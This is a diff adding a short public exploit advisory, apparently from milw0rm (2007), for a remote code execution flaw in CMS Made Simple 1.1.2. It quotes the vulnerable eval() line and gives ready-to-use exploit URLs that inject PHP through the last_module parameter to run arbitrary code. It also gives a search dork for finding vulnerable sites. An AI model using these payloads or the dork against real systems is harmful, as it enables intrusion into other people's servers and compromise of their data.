@@ -1,0 +1,25 @@
+#                                      o      [bug]     /"*._         _        #
+#                 .                     .    .      .-*'`    `*-.._.-'/        #
+#                                   o       o     < * ))     ,       (         #
+#                            .           o          `*-._`._(__.--*"`.\        #
+#                                                                              #
+# vuln.: CMS Made Simple 1.1.2 Remote Code Execution Vulnerability             #
+# author: irk4z@yahoo.pl                                                       #
+# download:                                                                    #
+#  http://dev.cmsmadesimple.org/frs/download.php/1424/cmsmadesimple-1.1.2.zip  #
+# dork: "powered by CMS Made Simple version 1.1.2"                             #
+# greetz: cOndemned, kacper, str0ke                                            #
+
+# code:
+
+/lib/adodb_lite/adodb-perf-module.inc.php:
+...
+ eval('class perfmon_parent_EXTENDER extends ' . $last_module . '_ADOConnection { }');
+...
+
+# exploit:
+
+ http://[site]/[path]/lib/adodb_lite/adodb-perf-module.inc.php?last_module=zZz_ADOConnection{}eval($_GET[w]);class%20zZz_ADOConnection{}//&w=phpinfo();
+ http://[site]/[path]/lib/adodb_lite/adodb-perf-module.inc.php?last_module=zZz_ADOConnection{}eval($_GET[w]);class%20zZz_ADOConnection{}//&w=[ PHPCODE ]
+
+# milw0rm.com [2007-09-21]
